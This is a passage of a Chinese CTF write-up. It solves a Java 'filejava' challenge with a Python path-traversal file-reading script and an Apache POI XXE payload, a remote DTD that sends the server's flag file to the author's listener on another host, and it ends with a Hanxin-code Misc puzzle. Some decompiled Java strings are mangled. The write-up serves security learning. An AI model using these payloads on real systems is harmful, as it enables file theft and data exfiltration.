<h3 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h3><p>随意上传一个文件发现存在任意文件读</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>编写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line">url = <span class="string">"http://b2d90029-53ca-408c-b63e-17a44afcbf73.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remote</span><span class="params">(filename)</span>:</span></span><br><span class="line">    data = &#123;<span class="string">"filename"</span>: <span class="string">"../../../../../../../../.."</span> + filename&#125;</span><br><span class="line">    resp = sess.get(<span class="string">f"<span class="subst">&#123;url&#125;</span>DownloadServlet"</span>, params=data)</span><br><span class="line">    print(resp)</span><br><span class="line">    content = resp.content</span><br><span class="line">    print(content)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'&lt;title&gt;Test&lt;/title&gt;'</span> <span class="keyword">not</span> <span class="keyword">in</span> content:</span><br><span class="line">        download(filename, content)</span><br><span class="line">    <span class="comment"># return text</span></span><br><span class="line"><span class="comment"># download file</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(filename, text)</span>:</span></span><br><span class="line">    filename = filename[filename.rfind(<span class="string">"/"</span>) + <span class="number">1</span>:]</span><br><span class="line">    print(<span class="string">"[+] write %s"</span> %(filename))</span><br><span class="line">    f = open(filename, <span class="string">"wb"</span>)</span><br><span class="line">    f.write(text)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># local("/readflag")</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        remote(input(<span class="string">'file&gt;'</span>))</span><br></pre></td></tr></table></figure>

<p>查看/proc/self/maps得知tomcat路径</p>
<p>读取<code>../</code>使其报错让burp抓包也可以得到</p>
<p><img src="https://i.loli.net/2020/05/27/TIP2pohaeF7cn43.png" alt="image.png"></p>
<p>然后可以下载<code>/usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过以上信息将class全部下载下来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class</span><br></pre></td></tr></table></figure>

<p>使用<a href="http://java-decompiler.github.io/" target="_blank" rel="noopener"><code>jd-gui</code></a>反编译</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DownloadServlet.class</span></span><br><span class="line"><span class="keyword">import</span> cn.abc.servlet.DownloadServlet;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    doPost(request, response);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String fileName = request.getParameter(<span class="string">"filename"</span>);</span><br><span class="line">    fileName = <span class="keyword">new</span> String(fileName.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>);</span><br><span class="line">    System.out.println(<span class="string">"filename="</span> + fileName);</span><br><span class="line">    <span class="keyword">if</span> (fileName != <span class="keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">"flag"</span>)) &#123;</span><br><span class="line">      request.setAttribute(<span class="string">"message"</span>, <span class="string">");</span></span><br><span class="line"><span class="string">      request.getRequestDispatcher("</span>/message.jsp<span class="string">").forward((ServletRequest)request, (ServletResponse)response);</span></span><br><span class="line"><span class="string">      return;</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    String fileSaveRootPath = getServletContext().getRealPath("</span>/WEB-INF/upload<span class="string">");</span></span><br><span class="line"><span class="string">    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);</span></span><br><span class="line"><span class="string">    File file = new File(path + "</span>/<span class="string">" + fileName);</span></span><br><span class="line"><span class="string">    if (!file.exists()) &#123;</span></span><br><span class="line"><span class="string">      request.setAttribute("</span>message<span class="string">", "</span>);</span><br><span class="line">      request.getRequestDispatcher(<span class="string">"/message.jsp"</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    String realname = fileName.substring(fileName.indexOf(<span class="string">"_"</span>) + <span class="number">1</span>);</span><br><span class="line">    response.setHeader(<span class="string">"content-disposition"</span>, <span class="string">"attachment;filename="</span> + URLEncoder.encode(realname, <span class="string">"UTF-8"</span>));</span><br><span class="line">    FileInputStream in = <span class="keyword">new</span> FileInputStream(path + <span class="string">"/"</span> + fileName);</span><br><span class="line">    ServletOutputStream out = response.getOutputStream();</span><br><span class="line">    <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">      out.write(buffer, <span class="number">0</span>, len); </span><br><span class="line">    in.close();</span><br><span class="line">    out.close();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">findFileSavePathByFileName</span><span class="params">(String filename, String saveRootPath)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">    <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">0xF</span>;</span><br><span class="line">    <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    String dir = saveRootPath + <span class="string">"/"</span> + dir1 + <span class="string">"/"</span> + dir2;</span><br><span class="line">    File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">    <span class="keyword">if</span> (!file.exists())</span><br><span class="line">      file.mkdirs(); </span><br><span class="line">    <span class="keyword">return</span> dir;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ListFileServlet.class</span></span><br><span class="line"><span class="keyword">import</span> cn.abc.servlet.ListFileServlet;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListFileServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    doPost(request, response);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String uploadFilePath = getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">    Map&lt;String, String&gt; fileNameMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    String saveFilename = (String)request.getAttribute(<span class="string">"saveFilename"</span>);</span><br><span class="line">    String filename = (String)request.getAttribute(<span class="string">"filename"</span>);</span><br><span class="line">    System.out.println(<span class="string">"saveFilename"</span> + saveFilename);</span><br><span class="line">    System.out.println(<span class="string">"filename"</span> + filename);</span><br><span class="line">    String realName = saveFilename.substring(saveFilename.indexOf(<span class="string">"_"</span>) + <span class="number">1</span>);</span><br><span class="line">    fileNameMap.put(saveFilename, filename);</span><br><span class="line">    request.setAttribute(<span class="string">"fileNameMap"</span>, fileNameMap);</span><br><span class="line">    request.getRequestDispatcher(<span class="string">"/listfile.jsp"</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UploadServlet.class</span></span><br><span class="line"><span class="keyword">import</span> cn.abc.servlet.UploadServlet;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItem;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItemFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileUploadException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Sheet;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Workbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.WorkbookFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    doPost(request, response);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String savePath = getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">    String tempPath = getServletContext().getRealPath(<span class="string">"/WEB-INF/temp"</span>);</span><br><span class="line">    File tempFile = <span class="keyword">new</span> File(tempPath);</span><br><span class="line">    <span class="keyword">if</span> (!tempFile.exists())</span><br><span class="line">      tempFile.mkdir(); </span><br><span class="line">    String message = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">      factory.setSizeThreshold(<span class="number">102400</span>);</span><br><span class="line">      factory.setRepository(tempFile);</span><br><span class="line">      ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload((FileItemFactory)factory);</span><br><span class="line">      upload.setHeaderEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">      upload.setFileSizeMax(<span class="number">1048576L</span>);</span><br><span class="line">      upload.setSizeMax(<span class="number">10485760L</span>);</span><br><span class="line">      <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(request))</span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">      List&lt;FileItem&gt; list = upload.parseRequest(request);</span><br><span class="line">      <span class="keyword">for</span> (FileItem fileItem : list) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">          String name = fileItem.getFieldName();</span><br><span class="line">          String str = fileItem.getString(<span class="string">"UTF-8"</span>);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        String filename = fileItem.getName();</span><br><span class="line">        <span class="keyword">if</span> (filename == <span class="keyword">null</span> || filename.trim().equals(<span class="string">""</span>))</span><br><span class="line">          <span class="keyword">continue</span>; </span><br><span class="line">        String fileExtName = filename.substring(filename.lastIndexOf(<span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">        InputStream in = fileItem.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> (filename.startsWith(<span class="string">"excel-"</span>) &amp;&amp; <span class="string">"xlsx"</span>.equals(fileExtName))</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">            Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">            System.out.println(sheet.getFirstRowNum());</span><br><span class="line">          &#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">            System.err.println(<span class="string">"poi-ooxml-3.10 has something wrong"</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">          &#125;  </span><br><span class="line">        String saveFilename = makeFileName(filename);</span><br><span class="line">        request.setAttribute(<span class="string">"saveFilename"</span>, saveFilename);</span><br><span class="line">        request.setAttribute(<span class="string">"filename"</span>, filename);</span><br><span class="line">        String realSavePath = makePath(saveFilename, savePath);</span><br><span class="line">        FileOutputStream out = <span class="keyword">new</span> FileOutputStream(realSavePath + <span class="string">"/"</span> + saveFilename);</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">          out.write(buffer, <span class="number">0</span>, len); </span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line">        message = <span class="string">";</span></span><br><span class="line"><span class="string">      &#125; </span></span><br><span class="line"><span class="string">    &#125; catch (FileUploadException e) &#123;</span></span><br><span class="line"><span class="string">      e.printStackTrace();</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    request.setAttribute("</span>message<span class="string">", message);</span></span><br><span class="line"><span class="string">    request.getRequestDispatcher("</span>/ListFileServlet<span class="string">").forward((ServletRequest)request, (ServletResponse)response);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private String makeFileName(String filename) &#123;</span></span><br><span class="line"><span class="string">    return UUID.randomUUID().toString() + "</span>_<span class="string">" + filename;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private String makePath(String filename, String savePath) &#123;</span></span><br><span class="line"><span class="string">    int hashCode = filename.hashCode();</span></span><br><span class="line"><span class="string">    int dir1 = hashCode &amp; 0xF;</span></span><br><span class="line"><span class="string">    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;</span></span><br><span class="line"><span class="string">    String dir = savePath + "</span>/<span class="string">" + dir1 + "</span>/<span class="string">" + dir2;</span></span><br><span class="line"><span class="string">    File file = new File(dir);</span></span><br><span class="line"><span class="string">    if (!file.exists())</span></span><br><span class="line"><span class="string">      file.mkdirs(); </span></span><br><span class="line"><span class="string">    return dir;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>DownloadServlet</code>过滤掉了<code>flag</code>关键字，<code>UploadServlet</code>专门检测了xlsx文件，并使用<code>poi-ooxml-3.10</code></p>
<p>确定是Apache POI XML外部实体漏洞即XXE漏洞 <span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjk5Ng==">https://xz.aliyun.com/t/6996<i class="fa fa-external-link-alt"></i></span></p>
<p>新建xlsx文件，命名为<code>excel-crzz.xlsx</code></p>
<p>解压修改<code>[Content_Types].xml</code>，在第二行加入实体</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://frps:6009/file.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>本地Web根目录构造<code>file.dtd</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://frps:6010/?flag=%file;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>6009端口开web服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server 6009</span><br></pre></td></tr></table></figure>

<p>6010端口开nc监听</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -L -p 6010</span><br></pre></td></tr></table></figure>

<p>上传<code>excel-crzz.xlsx</code></p>
<p>web服务收到<code>GET /file.dtd HTTP/1.1</code>请求</p>
<p>nc监听到GET包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;?flag&#x3D;flag&#123;43c57fc3-565e-42d9-ac87-5dd5087f7ed9&#125; HTTP&#x2F;1.1</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">User-Agent: Java&#x2F;1.8.0_252</span><br><span class="line">Host: frps:6010</span><br><span class="line">Accept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, *&#x2F;*; q&#x3D;.2</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="虚幻2"><a href="#虚幻2" class="headerlink" title="虚幻2"></a>虚幻2</h3><p>18年的网鼎杯有一题<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjYxNA==">虚幻<i class="fa fa-external-link-alt"></i></span>，是关于<span class="exturl" data-url="aHR0cDovL3d3dy5kb2M4OC5jb20vcC0xOTAxOTI2NTQ4MTIyLmh0bWw=">汉信码<i class="fa fa-external-link-alt"></i></span>的</p>
<p>猜测今年也是汉信码</p>
<img src="https://i.loli.net/2020/05/27/p7sqYdTHz4XENuV.png" alt="file.png" style="zoom:200%;" />

<p>可以看出图像像是汉信码压扁了的样子，编写脚本将其展开查看</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">"file.png"</span>)</span><br><span class="line">arr = im.load()</span><br><span class="line">(x, y) = im.size</span><br><span class="line">print(x, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">(input)</span>:</span></span><br><span class="line">    black = Image.new(<span class="string">"RGB"</span>, (<span class="number">10</span>, <span class="number">10</span>), <span class="string">"black"</span>)</span><br><span class="line">    out = Image.new(<span class="string">"RGB"</span>, (<span class="number">360</span>, <span class="number">360</span>), <span class="string">"white"</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">not</span> input[x][y]):</span><br><span class="line">                out.paste(black, (x * <span class="number">10</span>, y * <span class="number">10</span>))</span><br><span class="line">    out.save(<span class="string">"generate.png"</span>)</span><br><span class="line"></span><br><span class="line">ar = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">    ar.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> arr[i, j][s] == <span class="number">255</span>:</span><br><span class="line">                ar[i].append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ar[i].append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">gen(ar)</span><br></pre></td></tr></table></figure>

<p>查看展开后的汉信码，按照格式将角码翻转得到</p>
<p><img src="https://i.loli.net/2020/05/27/r81S7lWVh9Yf4IE.png" alt="generate.png"></p>
<p>现在有两种可能性：<code>上下颠倒</code>和<code>逆时针旋转</code>。</p>
<p>还有缺的那一块的问题，因为这种汉信码带纠错区，尝试随便涂一涂看能不能纠错，最后以下图形可以<span class="exturl" data-url="aHR0cDovL3d3dy5lZml0dGVjaC5jb20vaHhkZWMuaHRtbA==">识别<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://i.loli.net/2020/05/27/vgKcr96CTejnLYZ.png" alt="Snipaste_2020-05-12_22-53-52.png"></p>
<blockquote>
<p>之前能扫出来，现在那个网站已经不堪重负挂了，不知道还有没有别的方法扫</p>
</blockquote>
<p>正常扫出来是<code>flag{eed70c7d-e530-49ba-ad45-80fdb7872e0a}</code></p>
<h3 id="Teslaaaaa"><a href="#Teslaaaaa" class="headerlink" title="Teslaaaaa"></a>Teslaaaaa</h3><p>参考链接：</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTk0NzIuaHRt">https://bbs.pediy.com/thread-259472.htm<i class="fa fa-external-link-alt"></i></span></li>
